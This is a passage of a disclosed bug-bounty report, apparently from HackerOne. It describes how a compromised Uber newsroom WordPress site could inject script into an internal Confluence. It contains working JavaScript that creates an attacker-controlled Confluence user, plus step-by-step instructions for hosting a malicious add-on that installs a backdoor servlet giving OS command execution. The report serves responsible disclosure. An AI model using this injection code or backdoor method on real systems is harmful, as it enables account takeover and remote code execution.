This has been the main reason why you've assessed the WP vulnerabilities as low risk. However, it looks like to me compromising the newroom.uber.com site hosted at WPEngine opens a trivial way to an attacker to compromise team.uberinternal.com too.\n\nMany (possibly most or all) pages on the said Atlassian Confluence environment refer a script hosted on newsroom.uber.com. For example on the 404 error page:\n~~~~ html\n\u003cscript src=\"https://newsroom.uber.com/wp-content/uploads/adrum.js\"\u003e\u003c/script\u003e\n~~~~\nAn attacker exploiting a vulnerability on *newsroom* can modify the adrum.js file. I've previously demonstrated controlling files under the webroot.\n\nAny injected script would be evaluated for Uber employees logged on Confluence. For instance, this example script (tested on my local test Confluence) appended in adrum.js would create a new Confluence user with a password chosen by the attacker:\n~~~~ javascript\n(function(){\nvar token=AJS.Meta.get('atl-token');\nvar x=new XMLHttpRequest();\nx.open('POST','/admin/users/docreateuser.action');\nx.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\nx.send('atl_token='+token+'\u0026username=attacker\u0026fullName=foo\u0026email=new@attacker.com\u0026password=new\u0026confirm=new');\n})();\n~~~~\nUser management in Confluence has an additional security measure: an admin password is asked before allowing the operation. However, the injected script would attempt to create the user on every pageload, and if an administrator enters the user management legitimately any time, the request succeeds.\n\nOf course, this is merely one simple example of what the injected script could do.\n","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-06T09:57:02.490Z","allow_singular_disclosure_after":-168752549.0739651,"singular_disclosure_allowed":true,"vote_count":4,"voters":["fizhimchik","japz","spetr0x","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":942726,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I made a quick example of how an attacker could have achieved RCE on *team.uberinternal.com* using the *newsroom* vulnerabilities. JavaScript injected in Confluence, when evaluated in an administrator context, can be used to install an add-on/plugin containing the attacker's code. In this example the malicious add-on creates a backdoor servlet.\n\n1. For clarity, in this example the malicious add-on has to be hosted on an external website (it could be also embedded base64-encoded in the JavaScript). The server should allow the file to be loaded with AJAX, i.e. add a CORS header. With Apache .htaccess for example:\n~~~~\nHeader add Access-Control-Allow-Origin \"*\"\n~~~~\n\n2. Append the contents of *injected.js* in the adrum.js which is loaded into Confluence from *newsroom*. The URL in the beginning should be changed to where the plugin is hosted. For testing, you can also add something like this in the template:\n~~~~\n\u003cscript src=\"https://testserver/injected.js\"\u003e\u003c/script\u003e\n~~~~\n\n3. Now, next time a Confluence administrator (doing some administration, after re-entering password which is probably required by default) views any page loading the adrum.js script (e.g. front page), the malicious plugin is installed by some hidden AJAX requests and an iframe.\n\n4. The installed backdoor could be accessed at https://team.uberinternal.com/plugins/servlet/exploit . You can enter commands which are executed on the operating system side.\n\nI tested this on Linux and the latest Atlassian Confluence.","automated_response":false,"created_at":"2016-05-05T20:04:35.423Z","updated_at":"2016-05-05T20:04:35.423Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":91745,"filename":"atlassian-exploit.zip","type":"application/zip","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/745/b0ee30be961a676f7fcb5b570bc7d09a723c9a8b/atlassian-exploit.zip?response-content-disposition=attachment%3B%20filename%3D%22atlassian-exploit.zip%22%3B%20filename%2A%3DUTF-8%27%27atlassian-exploit.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ76PP2BUX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133931Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIGHP7cIwt2Tsf8KjliDyT5Lb7ly0JskiaYe2ChAX3AmbAiAqtHMw8uLFecT9g9U5UE%2FCxE1a%2BtPZJAnSYYnH2BI8piqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMzMSFx2nvHLNo5SLgKtcDcW%2FgFn8cU0mgC1%2FVdGfTPYSBsMiGZbBVEFWLz7BIkAjvx1Yl0xNwccsia5mxGh5Pof1BmLOj%2FPbfN0yxfjTbBvX%2BtxFisFe4lleD7sAfIMQHgrItYYlJlrAkcGTOF0hj5oy17q8C901VMWg1M3Oq1DUHqNUDjNiOuNs3pYI8%2F%2FpJPSaJwkT0kt%2FgzY3%2FaZ0aVY4K5doqZxp2VxJBM6CwnM47o6IbMvH%2F6hCdkC2dfUYQhPAa%2FygUp%2Fmm%2FrBM1LnDwRHK5mENZHzc9lNN77yHKCN1H3z9bi6t%2FdgHvkJFjucgPEBep99zqb1GTqjJfJh62po7%2FS6VgiubeoT%2ByWP%2FtbqeYVZAMxxgiX1mB4dTzOp9zUHuTJ5nixo2KbV6zjXbuM3CsrhUAywRCeq1ysa5sihESBZMzWy4KTeSnnVgA3YGSpb6bjYVcuyXShrdtMdh%2Bi%2Fut350eVReQuhtta9UeSQASWy1DEqou8oW6%2BWrK%2Fu8ty%2Bdy03u84XY3jIFi15g20CivixBXwDrJq5GMnahFYcvlzz%2FNfvLxBKnaZyOEiCkM%2BOhX4C4%2BLxcdNS1%2B%2FJZkMdX5isJd3PLZxJ0Za4ah4jaZUkoTXoWEByAePJ%2FcQ2oGnMS56ZNMLTgkIsGOqYBDJcz6RvFiMKVMfgvSf0yaXoPP4o%2BD%2Fa8JI%2BvkanDoFK0GH2rrIW6QMEbvg1sbDA%2B9VmM8kFxkCwfS%2F888Z5ykzUXec2dE5NYyugHVg5stjEJdkzVfFm30TsJCuULkIUdUPpiclOA72MSSbJsTlChJhjuLyQb8nARpH6iLndWaVXQjXW0hsGl9kRoYIkectIjPcMElLSYn47zPkurLskrWPNIcaHBlw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b43933e5e1f4a0d0081ae7fb6aab71357be4bdab9398b22447b76c58d9e163f1"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":942735,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's how the backdoor servlet works on a test server.
